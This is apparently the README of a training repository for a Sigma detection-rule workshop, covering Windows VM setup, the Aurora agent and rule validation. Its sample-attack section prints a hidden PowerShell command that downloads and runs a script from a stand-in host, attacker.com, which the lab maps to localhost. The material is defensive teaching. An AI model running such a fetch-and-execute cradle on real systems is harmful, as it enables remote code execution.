# Live_Let_Sigma
Files used in Sigma Rules Workshop: Live and Let Sigma

- Sigma rules
- Aurora Agent Batch files
- python helper scripts
- attck files
- attacker web files

## How to setup the VM for testing

1. Setup Windows 10 Virtual machine in any of your prefered Virtulization Environment
2. Install 7zip , notepad++ (Or any other editor you support YAML syntax hightlight)
3. If you are Lazy then just download and install https://github.com/ameygat/Live_Let_Sigma/blob/main/live_let_sigma_setup_0.1.exe then you can skip to Step 6. Otherwise follow step 4,5 manually
4. Copy and extract all archives to C:\ folder
5. Add following line at the end of C:\Windows\System32\drivers\etc\hosts file
  `127.0.0.1       attacker.com`
6. Install python 3.14.2 or higher version in Windows 10 VM
7. Run command python -m pip install -r C:\sigma_test_repo\requirements.txt
8. Register for Aurora Lite agent at https://www.nextron-systems.com/aurora/
9. Confirm Email and then login with same account
10. Just download License file and copy it to the folder C:\aurora-agent-lite-win-pack\
11. Now you are ready to create and test sigma rule files

## Detail steps and Important Slides Handout
Below is brief steps in Readme, if you want slides handout see the file https://github.com/ameygat/Live_Let_Sigma/blob/main/Handouts_Live_and_Let_Sigma.pdf

## Command to start the Custom Aurora Agent

```
C:\>cd aurora-agent-lite-win-pack

C:\aurora-agent-lite-win-pack>start_custom_agent.bat

```
Output would be something like:
<img width="1201" height="817" alt="image" src="https://github.com/user-attachments/assets/0d8e1282-f00a-40c9-b4fb-c4c377157def" />

## Open Dashbord
- Right click on Aurora Icon near bottom right of windows taskbar
- Click on Open Dashboard
- If dashboard not opened just paste url http://localhost:17494/ui/dashboard/overview in the browser and open
<img width="1350" height="745" alt="image" src="https://github.com/user-attachments/assets/51f081e7-e5e1-422d-933f-f2a509b0970d" />

## Instruction after adding new fule file
- New rule files are to be stored with yml extension
- validate new file using following command
  `python C:\sigma_test_repo\validate_sigma.py C:\custom_sigma_rules\YOUR_SIGMA_FILE_NAME.yml`
- Stop the Aurora Agent by opening its windows and press Ctrl+C
- Start Aurora Agent commands given in section "Command to start the Custom Aurora Agent"

## Start simulated attacker web server
= Run following command
`C:\aurora-agent-lite-win-pack\web_server_start.bat`

## Sample attack files and written rule files which were shown in workshop (some bonus attacks also added)
1. Add auto start registry entry
  ```
  Windows + R -> cmd.exe
  cd c:\attack
  attack01.bat
  ```

2. Run Following command
   ```
   powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
   ```

## Bonus 
- Checkout extra attack files in the c:\attack folder
- See what type of attack they are doing
- Try to create Sigma rules to raise alert for these attacks

## Issues
- For any errors in files raise a issue in the github repo

## Contributions 
- You can create attack with YOUR_ATTACK_NAME.bat
- and sigma rule with YOUR_ATTACK_NAME.yml
- add both of these files to folder new_attack in repo


